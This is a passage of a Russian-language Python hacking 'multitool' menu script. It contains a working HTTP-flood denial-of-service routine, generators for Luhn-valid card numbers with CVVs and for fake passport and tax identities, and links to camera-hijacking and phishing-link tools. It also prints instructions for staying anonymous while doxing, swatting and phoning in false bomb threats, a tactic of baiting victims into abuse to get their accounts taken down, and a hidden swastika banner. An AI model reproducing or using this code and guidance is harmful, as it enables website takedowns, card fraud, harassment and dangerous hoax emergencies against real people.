  •   https://github.com/spyboy-productions/r4ven  - Взлом камеры, местоположения, инфа о устройстве сайт можно свой написать, если необходимо, то обращайтесь @MarginalDeveloper
  •   https://github.com/techchipnet/CamPhish - не тестил, но вроде нормально тоже, сайты везде блядь не на рф коммьюнити уж точно
  •   https://github.com/noob-hackers/grabcam - с этой имбульки начинал.     
  •   https://github.com/spyboy-productions/Facad1ng - Маск фишинг ссылки.                                                                                                                                                                                                
                                    \n''', pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "11":
                pystyle.Write.Print('''\n Снова я, @MarginalDeveloper. Я такое осуждаю поэтому вырезал из скрипта\n''', pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "12":
                pystyle.Write.Print('''\nРуководство по обеспечению анонимности

[Доксинг]

При вступлении в сообщество обезличивания, необходимо осознать дополнительные риски, поскольку следует помнить: найдется человек, способный разоблачить вас в кратчайшие сроки.

Анонимность в Telegram - базовый уровень. Она включает использование виртуальных номеров, однако стоит помнить, что эта услуга не обеспечит полной защиты из-за возможности сохранения логов. Поэтому рекомендуется искать поставщиков услуг с активными номерами и фальшивой информацией. Например, пользователя по имени "смолин" либо тех, кто рекламирует подобные услуги на своем телеграм-канале.

Этот раздел ориентирован на русскоязычных пользователей. Для украинцев проще: достаточно приобрести сим-карту Vodafone и зарегистрировать на нее исключительно аккаунт в Telegram.

Затем необходимо удалить свои данные из "глаза бога". Думаю, многие знакомы с этой процедурой. Но зачем она, если у вас чистый или виртуальный номер? Личность может начать поиски, уверенная, что ваш аккаунт содержит достоверную информацию. Это усложняет ее задачу при использовании популярных ботов для извлечения номеров, таких как Quick Osint, BlackatSearch, GTA, SmartSearch.

Кроме того, стоит учитывать следующие пять простых правил:

1. НИКОГДА не разглашайте личную информацию, используйте чужие имя, возраст, страну и город проживания, никаких подробностей.
2. НИКОГДА не передавайте свой номер телефона, даже если он чистый или виртуальный. Не отправляйте его ботам, включая "глаз бога". Многие боты могут использовать скрипты деанонимизации, запрашивая ваш контакт.
3. При покупке подписки в "глазе бога" используйте временную почту, например, через сервис TempMail, чтобы избежать утечки вашей почты.
4. Не используйте одинаковые имена пользователей для своих аккаунтов.
5. Используйте прокси. Некоторые участники сообщества создают сайты с IP-логгерами. Для предотвращения утечки местоположения и IP-адреса настройте прокси-сервер в Telegram и открывайте ссылки прямо в приложении Telegram или используйте VPN, если не уверены в настройках.

Анонимность в Telegram - это основа. Но что делать вне Telegram? Кроме Telegram существуют сообщества в VKontakte и Discord. Как обезопасить себя? Избегайте русскоязычные социальные сети и сервисы, так как они также могут подвергать вас риску утечки данных. VKontakte является одной из наименее безопасных социальных сетей. Рекомендуется удалить все свои личные аккаунты и отписаться от групп, связанных с родственниками, друзьями, школами или городами. Это не относится к Telegram. Очищайте аккаунты и затем удаляйте их.

[Swatting]

Анонимность в этом случае базируется на четырех основных компонентах: прокси-сервере, VPN, Tor-браузере и Linux.

Настройку Tor и Linux для анонимности можно найти на YouTube, так как это не секрет и в сети много подобных видеороликов.
VPN. Я лично использую Nord и Mullvad для сваттинга или лжеминирования. Важно использовать сразу два VPN для лучшей анонимности.
Прокси. Не используйте бесплатные прокси-сервера, купите платные, чтобы обеспечить полную безопасность.

Кроме того, для окончательной безопасности в сети при сваттинге или лжеминировании используйте не свой домашний Wi-Fi или мобильный интернет. Рекомендуется подключаться к бесплатной сети в кафе и использовать ее для незаконных действий.

!! ВАЖНО !!

При сваттинге или лжеминировании НИ ПО КАКИМ ОБСТОЯТЕЛЬСТВАМ НЕ ПОСЕЩАЙТЕ САЙТЫ, НА КОТОРЫХ МОЖЕТ БЫТЬ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ. Включайте VPN только при регистрации почты для отправки писем, а затем отключайте его.

Отправили письмо - следуйте этим же шагам в правильной последовательности. Выйдите из Tor, Linux, а затем из VPN.\n''', pystyle.Colors.green_to_red, interval = 0.005)
            if choice == '19':
                subprocess.Popen(["pScan.exe"], creationflags=subprocess.CREATE_NEW_CONSOLE)
                pystyle.Write.Print("\n[?] Выберите режим: ", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("\n\n[?] 1 - проверить часто используемые порты", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("\n\n[?] 2 - проверить указанный порт", pystyle.Colors.green_to_red, interval=0.005)
                mode = pystyle.Write.Input("\n\n[?] Ваш выбор: ", pystyle.Colors.green_to_red, interval=0.005)
                
                if mode == "1":
                    print()
                    ports = [
                        20,
                        26,
                        28,
                        29,
                        55,
                        53,
                        80,
                        110,
                        443,
                        8080,
                        1111,
                        1388,
                        2222,
                        1020,
                        4040,
                        6035,
                    ]
                    for port in ports:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        result = sock.connect_ex(("127.0.0.1", port))
                        if result == 0:
                            pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.green_to_red, interval=0.005)
                        else:
                            pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.green_to_red, interval=0.005)
                        sock.close()
                        print()
                elif mode == "2":
                    port = pystyle.Write.Input("\n[?] Введите номер порта: ", pystyle.Colors.green_to_red, interval=0.005)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex(("127.0.0.1", int(port)))
                    print()
                    if result == 0:
                        pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.green_to_red, interval=0.005)
                    else:
                        pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.green_to_red, interval=0.005)
                    sock.close()
                    print()
                else:
                    pystyle.Write.Print("\n[!] Неизвестный режим", pystyle.Colors.green_to_red, interval=0.005)
                    print()
            if choice == "14":
                fake = faker.Faker(locale="ru_RU")
                gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.green_to_red, interval=0.005)
                print()
                if gender not in ["М", "Ж"]:
                    gender = random.choice(["М", "Ж"])
                    pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.green_to_red, interval=0.005)
                if gender == "М":
                    first_name = fake.first_name_male()
                    middle_name = fake.middle_name_male()
                else:
                    first_name = fake.first_name_female()
                    middle_name = fake.middle_name_female()
                last_name = fake.last_name()
                full_name = f"{last_name} {first_name} {middle_name}"
                birthdate = fake.date_of_birth()
                age = fake.random_int(min=18, max=80)
                street_address = fake.street_address()
                city = fake.city()
                region = fake.region()
                postcode = fake.postcode()
                address = f"{street_address}, {city}, {region} {postcode}"
                email = fake.email()
                phone_number = fake.phone_number()
                inn = str(fake.random_number(digits=12, fix_len=True))
                snils = str(fake.random_number(digits=11, fix_len=True))
                passport_num = str(fake.random_number(digits=10, fix_len=True))
                passport_series = fake.random_int(min=1000, max=9999)
                pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "15":
                start_url = pystyle.Write.Input("[?] Введите ссылку -> ", pystyle.Colors.green_to_red, interval=0.005)
                max_depth = 2
                visited = set()
                def crawl(url, depth=0):
                    if depth > max_depth:
                        return
                    parsed = urllib.parse.urlparse(url)
                    domain = f"{parsed.scheme}://{parsed.netloc}"
                    if url in visited:
                        return
                    try:
                        response = requests.get(url)
                        html = response.text
                        soup = bs4.BeautifulSoup(html, "html.parser")
                    except:
                        return
                    visited.add(url)
                    pystyle.Write.Print("[+] " + url + "\n", pystyle.Colors.green_to_red, interval=0.005)
                    for link in soup.find_all("a"):
                        href = link.get("href")
                        if not href:
                            continue
                        href = href.split("#")[0].rstrip("/")
                        if href.startswith("http"):
                            href_parsed = urllib.parse.urlparse(href)
                            if href_parsed.netloc != parsed.netloc:
                                continue
                        else:
                            href = domain + href
                        crawl(href, depth + 1)
                print()
                crawl(start_url)
            if choice == "16":
                def dos1():
                    try:
                        def generate_user_agent():
                            versions = [
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                            ]
                            version = random.randint(60, 90)
                            year = random.randint(10, 21)
                            month = random.randint(1, 12)
                            user_agent = random.choice(versions).format(version, year, year, month)
                            return user_agent
                        def make_request(url):
                            headers = {
                                'User-Agent': generate_user_agent()
                            }
                            response = requests.get(url, headers=headers)
                            print(f"\n{colorama.Fore.green_to_red}[{colorama.Fore.WHITE}+{colorama.Fore.green_to_red}]{colorama.Fore.MAGENTA} Атака началась, состояние сайта: ", response.status_code)
                        def dos():
                            url = input(f"{colorama.Fore.green_to_red}[{colorama.Fore.WHITE}?{colorama.Fore.green_to_red}]{colorama.Fore.MAGENTA} Введите ссылку : ")
                            power = input(f"{colorama.Fore.green_to_red}[{colorama.Fore.WHITE}?{colorama.Fore.green_to_red}]{colorama.Fore.MAGENTA} Выберите режим (1 - Слабый/2 - Средний/3 - Мощный) : ")
                            if power == "1":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            elif power == "2":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            elif power == "3":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            else:
                                print(f"\n{colorama.Fore.green_to_red}[{colorama.Fore.WHITE}!{colorama.Fore.green_to_red}]{colorama.Fore.MAGENTA} Нет такого режима!")
                        dos()
                    except:
                        print(f'\n{colorama.Fore.green_to_red}[{colorama.Fore.WHITE}!{colorama.Fore.green_to_red}]{colorama.Fore.MAGENTA} Произошла ошибка! Проверьте ввод данных!')
                dos1()
            if choice == "17":
                pystyle.Write.Print("\n[?] Выберите страну:\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("[?] 1: Украина\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("[?] 2: Россия\n", pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("[?] 3: Казахстан\n", pystyle.Colors.green_to_red, interval=0.005)        
                country_choice = pystyle.Write.Input("\n[?] Ваш выбор: ", pystyle.Colors.green_to_red, interval=0.005)        

                if country_choice == "1":
                    country = "Украина"
                elif country_choice == "2":
                    country = "Россия"
                elif country_choice == "3":
                    country = "Казахстан"
                else:
                    pystyle.Write.Print("\n[!] Неправильный ввод.\n", pystyle.Colors.green_to_red, interval=0.005)

                def generate_card_number():
                    bin_number = "4"  
                    for _ in range(5):
                        bin_number += str(random.randint(0, 9))

                    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
                    card_number = bin_number + account_number
                    checksum = generate_checksum(card_number)
                    card_number += str(checksum)

                    return card_number

                def generate_checksum(card_number):
                    digits = [int(x) for x in card_number]
                    odd_digits = digits[-2::-2]
                    even_digits = digits[-1::-2]
                    checksum = sum(odd_digits)
                    for digit in even_digits:
                        checksum += sum(divmod(digit * 2, 10))
                    return (10 - checksum % 10) % 10

                def generate_expiry_date():
                    month = random.randint(1, 12)
                    year = random.randint(24, 30)  
                    return "{:02d}/{:02d}".format(month, year)

                def generate_cvv():
                    return ''.join(str(random.randint(0, 9)) for _ in range(3))

                def generate_random_card(country):
                    card_number = generate_card_number()
                    expiry_date = generate_expiry_date()
                    cvv = generate_cvv()
                    return {
                        "Страна": country,
                        "Номер карты": card_number,
                        "Срок действия": expiry_date,
                        "CVV": cvv
                    }

                card = generate_random_card(country)
                pystyle.Write.Print("\n[+] Страна: " + card["Страна"], pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] Номер карты: " + card["Номер карты"], pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] Срок действия: " + card["Срок действия"], pystyle.Colors.green_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] CVV: " + card["CVV"] + "\n", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "18":
                def mac_lookup(mac_address):
                    api_url = f"https://api.macvendors.com/{mac_address}"
                    try:
                        response = requests.get(api_url)
                        if response.status_code == 200:
                            return response.text.strip()
                        else:
                            return f"Error: {response.status_code} - {response.text}"
                    except Exception as e:
                        return f"Error: {str(e)}"
                mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.green_to_red, interval = 0.005)  # Replace this with the MAC address you want to lookup
                vendor = mac_lookup(mac_address)
                pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "13":
                pystyle.Write.Print('''\nПровоцируем жертву на угрозы, оски, буллинг и тд. Дальше пишем на почту DMCA@telegram.org. В письме указывем скриншоты булинга, угроз и тд. "Здраствуйте, хочу подать жалобу на (юзер и айди типа).  уважением, пользователь" и все, главное скриншоты - доказательства\n''', pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "1488":
                if platform.system()=='Windows':
                    pystyle.Anime.Fade(pystyle.Center.Center("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK0kxdollcccccccccccloodxO0KNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0Oxdollc::::;;;;;;;;;;;;;;;::::clodxkO0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxolc:;;;;;:::::;:::;;::;;;;;::::;::::;;;;::cldkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0kdl::;;:;;::::;::;::::::::;;:;:::;;:::::::::::::::;;:cldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKkdl::;::::;::;:::;;:::::;;;::;;::::::::::;::::::::::::::::;;::ldOKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMWN0xoc::::;;::::::::::;;;::::::;::::::::;::::::::::::::::::::::;::;::::cokKWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWNKko:;;::::;::;;::::::::;;::::;;;;;;;;;;;;;;;;;;;::::::;::::::::::::;;:::;;:cokXWMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMWXOoc:;:;;:::::;:::::::::::;;:clloddxkOOOOOOOOOOkkxddolc::;;;::::::::::::;:::;;:::cx0NWMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMWXkl:;;;:::::::;::;:;;:;;:cldxO0KXNWWWMMMMMMMMMMMMMMMWWWNXK0kxol::;:::;:;;:::::;::::;:coOXWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMWKxl::;:::::::::::;::;;:coxOKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXKOxoc:;;:;:::::::::::::;:oOXWMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMWXkl::;::;:::::::::;;:cox0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOdl:;::;;:::::::::::;:oONMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMNOl::;::::::::::::;:cokKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0xl:;;;::::::::::::::o0NMMMMMMMMMMMMM\nMMMMMMMMMMMWKo::::::;::::::::::;:o0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0dc:::::::::::;::;:cxKWMMMMMMMMMMM\nMMMMMMMMMMNkc:;:::::::::::::::::;:lkXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkl:;::::::::::::::lONMMMMMMMMMM\nMMMMMMMMWKd::::::::::::::::::::;::;:lkXWWWWMMMMMMMMMMMMMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXkl:;:::::::::::::cxXWMMMMMMMM\nMMMMMMMW0l::;::::::::::::::::::;::::;:cc;;dNMMMMMMMMMMMNo,,,,,,;,,,,,,,,,,,,,,,,,,;;;;;;;;;;;;;;;xNXkl:::::::::::::;:dKWMMMMMMM\nMMMMMMNOc;::;::;:::::;::;;:::::::::;:::;,.lXMMMMMMMMMMMK;                                        cNMWKdc::;::;::::::::o0WMMMMMM\nMMMMMNkc;:::;::;::::;:oxo:;:;;::::::::::;;ckXWMMMMMMMMMK;                                        cNMMWNOl::::::::::::::l0WMMMMM\nMMMMNkc;::::::::::;;cxXWNOo:;::;::::::::;;;:lkXWMMMMMMMK;                                        cNMMMMWKd:;:::::::::;::l0WMMMM\nMMMWOc;;:::::;:::;:lONMMMWNOo:::::::::::::;:;:lkXWMMMMMK;                                        cNMMMMMMNxc;:::;::::::;;oKWMMM\nMMW0l;::::::::;:::l0WMMMMMMMKc';:::::;;::;::;:::lkXWMMMK;                                        cNMMMMMMMNkc;:;;:::::;:::dXWMM\nMWXo:;::::::::::;l0WMMMMMMMMX: .';:::::::::::::;;:lkXWMK;              ..........................oWMMMMMMMMNkc;;:::::::::::xNMM\nMNx:::;:::::::;;cOWMMMMMMMMMX:   .';:::::::::::::;::lkXK;             :0XXXXXXXXXXXXXXXXXXXXXXXXXNMMMMMMMMMMNx:;;:::::::::;cOWM\nW0l;:::;:::::;;:kNMMMMMMMMMMX:     .';:::::::::::::;::ld,             cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXd::::::::::;;:oXM\nNx:::::;:::::;:dXMMMMMMMMMMMX:       .';:::::;::::;::::;,.            cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0l;::::;::;::;ckW\n0l;;::;;:::::;c0WMMMMMMMMMMMX:         .';:::::::::::::::;,.          cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNk::::::;:::;;;oX\nx:;:::::;:::::dXMMMMMMMMMMMMX:           .,:;:::::::::::;;:;,.        cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKo;:::::::;::;c0\no::;;:::::::;cOWMMMMMMMMMMMMX:            :ko:;::::::::::;:::;,'.     cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx:;:::::::::;:x\nc;::::::::::;oKWMMMMMMMMMMMMX:            ,dd:,;::::::::::::::::;,.   ,dxxxxxxxxxxxxxxxxxxxxkkkkkKWMMMMMMMMMMMMW0c;::::::::;::o\nc;:::::::::;;dNMMMMMMMMMMMMMX:                 .';::::::::::::::::;,.                            lNMMMMMMMMMMMMMKo;::::::::::;l\n:::;:::::::::xWMMMMMMMMMMMMMX:                   .';:::::::::::::;::;,.                          lNMMMMMMMMMMMMMXd;:::::::;::;c\n:;;:::::::::ckWMMMMMMMMMMMMMX:                     .';:::::::::::;;:::;,.                        lNMMMMMMMMMMMMMXd;::::::::::;c\n:;::::::::;;ckWMMMMMMMMMMMMMX:                       .';::::::::::;:::::;,.                      lNMMMMMMMMMMMMMNd;:;:::;::;;;c\n:::::;;::::::kWMMMMMMMMMMMMMX;                         .';::::::::::::::::;,.                    lNMMMMMMMMMMMMMXd;::;:::::;:;c\nc;;:;;::::::;dNMMMMMMMMMMMMMX;                           .';:::;;:::::::::::;,.                  lNMMMMMMMMMMMMMKo;::;:::::::;l\nc;;:;;::::::;oXMMMMMMMMMMMMMWOdddddddddddddddddddddddddc.  .';:::::::::::;::;;;,,co:.            lWMMMMMMMMMMMMW0c;;::::::::::o\no::::::::::;;cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;    .';;::::::::;;::::::lkx'            lWMMMMMMMMMMMMWk:;;::;::::;::x\nx:;:::::::::;:xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;       .';:;;::::::::::::::'            lWMMMMMMMMMMMMXo;::;:::::::;cO\n0l;:;:::::;;:;l0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;         .';;::::::::::::::;,.          lWMMMMMMMMMMMWkc;::::::::;;;oX\nNd:;;:::::;::;:dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK,           .';;:::::::::::;::;,.        lWMMMMMMMMMMWKo;;:::::::::;:kN\nW0c;;:::::::::;ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;             ;l:;::::;::::;::::;,.      lWMMMMMMMMMMNx:;:::;:::::;;oKM\nMNx::::::::::::;l0WMMMMMMMMMMWNNNNNNNNNNNNNNNNNNNNNNNNN0,             lXOo:;::::::::::::::;,.    lWMMMMMMMMMNkc;::::::::::;cOWM\nMWKo:::::::::::::oKWMMMMMMMMNo,,,,,,,,,,,,,,,,,,,,,,,,,'.             lNWNOo:;;:::::::::;:::;,.  lWMMMMMMMMWOc;:::::::::;;:dXMM\nMMWOl;;:::::::::::o0WMMMMMMMX;                                        lWMMMNOo:;::::::::::::::;,'oNMMMMMMMNOc;::;:::::::;;oKWMM\nMMMNkc;:::;:::::;::l0WMMMMMMX;                                        lNMMMMWNOo:;:::;;:::::::::;ckXWMMMMNkc;::;;:::::;::l0WMMM\nMMMMNkc;::::;:::::::cONMMMMMX;                                        lNMMMMMMWNOo:;::::;::::::::;:lkXWWXxc;::;:::::::;;lOWMMMM\nMMMMMNx:;::::::;::;::cdKWMMMX;                                        lNMMMMMMMMWNOo:;::::::::::;::;:lkOo:;:::;:::::;:;cOWMMMMM\nMMMMMMNkc;:::::::::;:::lONMMX;                                        lNMMMMMMMMMMW0;';:::::::::::;:;::::;:::::::;;:::lOWMMMMMM\nMMMMMMMNOl;:;::;;::::::;:d0NXo''''''''''''''''''''''''''''''''''''''''xWMMMMMMMMMMMKc,:c:;::::;:::::::::::::::::;;:::o0WMMMMMMM\nMMMMMMMMW0o:;:::::::::::::cd0XNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWMMMMMMMMMMMMWNNNXOo:;::;;:::::::::::::::::;;:dXWMMMMMMMM\nMMMMMMMMMWXxc;::::::::::::;:cd0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0o:::;;:::::::::::::::::ckNMMMMMMMMMM\nMMMMMMMMMMMW0o::::::::::::::;;:okKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNkl::::::::::::::::;;:dKWMMMMMMMMMMM\nMMMMMMMMMMMMWXkc::;::;::::::;::;:cdOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkoc:::::::::::::;:;:lONMMMMMMMMMMMMM\nMMMMMMMMMMMMMMWKdc;;::;:::::::::::;:ldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0koc:;:::::::::::::;;:lkXWMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMWKdc:;;::::::::::;;::;:cldkKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kdl:;;::;;;:::::::::;;:lxKWMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMWKxc:;:::::::;::;::;::::::loxk0KXNWWMMMMMMMMMMMMMMMMMMMWWNXKOkxoc:;;::::;:::::::::::;;:lkKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMWKkl:::::;;:;::::::;;:::::;;:cloodxkkOO00000000OOOkkxdolc::;;;::::::::;::::::;::::coOXWMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWN0dl::;;::;;:::::::::::::::::;;;;;;;:::::::::;;;;;;:::::::::::::::;;:::;::;;:lxKNWMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMWXOdl:;;;::::::::::::::::::::::::::;;:::::::::::::::::::::::::::;;::::::lx0NWMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xlc:;:::::::::::::::::::::::::;;;:::::::::::::;;::::::::::;;::cok0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOdoc:;;::::::::::;;:::::;;::::;:::::::::::::::::::::;::coxOXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOkdlc:::;;::::::::::::::::::::::::::::::::;;::codk0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0Oxdolcc:::;;;;;::;::::;;;;;;::::cllodkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNXKOkxollccc:::;;::::ccclodxk0KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"),pystyle.Colors.green_to_red,pystyle.Colorate.Vertical)
                else:
                    pystyle.Anime.Fade(pystyle.Center.Center("MMMMMMMMWNKOxdlcc::::::ccldxOKNWMMMMMMMM\nMMMMMWN0xoc::;::ccllllcc::;;:cokKNWMMMMM\nMMMWNOoc:;:coxO0KXXXXXXK0Oxoc:;:cd0NWMMM\nMMW0o:::::o0NWMMMMMMMMMMMMWNKkoc;::dKWMM\nMNkc::::::cokXMMWOlllllllllllcoxo:::lONM\nNkc;:cxko::;:o0NNc            .kXkc:;ckN\nkc::cONWk,';::cdk:    .:ccccccoKMNkc:;cO\nl:;:xNMMk. .,;:::,.   cNMMMMMMMMMMNx:::o\n:;;l0WMMk.  .',;::;'..;dxxxxxxONMMW0l;;c\n::;oXMMMk.     .';:;;;'.      'OMMWKo;;:\n:;;oKMMM0:',,,,,,',;::;;'..   .OMMWKl;;:\nc;:cOWMMWWNNNNNNK: ..';;;:;.  .OMMWkc::l\nd:::oKWMWKKKKKKKO;    ;l:;:;'.'OMWKo:::x\nKo:::dXWO,.......     cKOo::;;:kNKd:::oK\nW0o:;:o0k,............oNWNkc:::col:;:oKW\nMWKd:::coxO00KKK0KKKKKNMMMNKkl:;;;;cxXWM\nMMWNOo:;::ox0XNWWMMMMMMWWNX0xl::::oONMMM\nMMMMWNOdc:;::codxkkkkkkxdoc::::cdONWMMMM\nMMMMMMMWKOdlc::;;;;;;;;;;::clxOXWMMMMMMM\nMMMMMMMMMMWXOxolc::::::clox0XWMMMMMMMMMM"),pystyle.Colors.green_to_red,pystyle.Colorate.Vertical)
            if choice == "20":
                num_agents = pystyle.Write.Input("\n[?] Введите кол-во User-agent -> ", pystyle.Colors.green_to_red, interval = 0.005)
                def generate_user_agents(num_agents):
                    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                    ]
                    for _ in range(num_agents):
                        version = random.randint(60, 90)
                        year = random.randint(10, 21)
                        month = random.randint(1, 12)
                        
                        user_agent = random.choice(versions).format(version, year, year, month)
                        pystyle.Write.Print("\n" + user_agent, pystyle.Colors.green_to_red, interval = 0.005)
                generate_user_agents(int(num_agents))
                print()
            if choice == "21":
                pystyle.Write.Print('''\n
    • https://hunter.io/domain-search - Информация о домене, + почты сотрудников
    • https://epieos.com/ - Информация о почте
    • Leak Osint - Бот по утечкам
    • Глаз Боба
    • UserBox
    • https://exposed.lol/  - Утечки Login:Pass выдает                                                                                                                              
